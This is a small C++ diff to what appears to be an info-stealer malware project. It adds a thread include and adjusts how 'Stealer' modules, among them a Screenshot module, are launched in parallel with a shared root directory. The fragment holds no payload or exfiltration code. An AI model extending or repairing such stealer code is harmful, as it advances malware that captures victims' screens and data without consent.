@@ -4,6 +4,8 @@
 
 #include "Stealer.h"
 #include "impl/Screenshot.h"
+#include <thread>
+
 
 void Stealer::registerModules() {
     this->modules.push_back(new Screenshot());
@@ -26,7 +28,7 @@ void Stealer::run() {
     std::vector<std::thread> threads;
 
     for (StealerImpl* module : this->modules) {
-        threads.emplace_back(&StealerImpl::execute, module, this->root_dir);
+        threads.emplace_back(&StealerImpl::execute, std::ref(module), std::ref(this->root_dir));
     }
 
     for (std::thread& thread : threads) {
